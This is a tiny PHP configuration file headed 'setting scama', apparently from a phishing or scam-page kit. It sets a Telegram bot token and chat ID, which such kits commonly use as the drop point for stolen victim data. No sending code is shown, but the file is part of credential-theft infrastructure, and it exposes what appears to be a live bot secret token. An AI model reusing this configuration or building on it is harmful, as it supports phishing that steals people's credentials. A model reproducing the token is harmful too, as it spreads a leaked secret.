<?php
// setting scama

$botToken="5134223346:AAG5kLZZxxkjuHYcIoBmb6_UBV2KktYjjT8"; // token bot telegram
$chatId="-1001761670911";  // chatId telegram

?>